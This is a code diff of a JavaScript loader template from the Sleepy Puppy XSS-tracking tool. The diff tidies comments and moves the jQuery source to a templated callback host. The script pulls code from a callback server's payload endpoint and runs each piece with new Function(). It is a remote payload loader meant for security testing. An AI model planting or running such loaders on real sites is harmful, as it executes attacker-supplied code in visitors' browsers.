@@ -11,13 +11,10 @@ if (typeof jQuery === 'undefined') {
         var head = document.getElementsByTagName('head')[0],
         done = false;
 
-        // Attach handlers for all browsers
         script.onload = script.onreadystatechange = function () {
 
             if (!done && (!this.readyState || this.readyState === 'loaded' || this.readyState === 'complete')) {
                 done = true;
-
-                // callback function provided as param
                 success();
                 script.onload = script.onreadystatechange = null;
                 head.removeChild(script);
@@ -25,10 +22,9 @@ if (typeof jQuery === 'undefined') {
         };
 
         head.appendChild(script);
-
     }
 
-    getScript('//code.jquery.com/jquery-1.11.3.min.js', function () {
+    getScript('{{callback_protocol}}://{{hostname}}/static/jquery-1.11.3.min.js', function () {
         loader();
     });
 
@@ -38,15 +34,15 @@ if (typeof jQuery === 'undefined') {
 
 function loader () {
     var return_information = [];
-$.ajax({
+    $.ajax({
     type: 'GET',
     url: "{{callback_protocol}}://{{hostname}}/api/javascript_loader/{{payload_id}}",
     dataType: 'json',
     success: function (data) {
         $.each(data, function(index, element) {
             new Function(element.code)();
-            //debug
-            //console.log("Sleepy Puppy is executing Javascript " + index)
+            // debug
+            // console.log("Sleepy Puppy is executing Javascript " + index)
         });
     }
 });
